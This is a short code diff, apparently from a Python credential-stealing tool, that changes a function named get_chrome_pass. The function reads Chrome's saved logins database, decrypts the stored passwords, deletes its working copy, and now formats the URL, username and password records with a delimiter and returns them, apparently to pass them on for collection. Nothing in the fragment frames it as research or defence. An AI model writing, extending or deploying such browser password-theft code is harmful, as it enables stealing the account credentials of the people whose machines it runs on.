@@ -16,11 +16,12 @@ def get_chrome_pass():
     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
     for tuple in cursor.fetchall():
         if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
-            login_data += tuple[0] + "," + tuple[1] + "," + decrypt(tuple[2], key) + "\n"
+            login_data += tuple[0] + "," + tuple[1] + "," + decrypt(tuple[2], key) + "|||"
     print(login_data)
     cursor.close()
     conn.close()
     os.remove("logindata.db")
+    return login_data
 
 
 def decrypt(raw_encrypted, key):
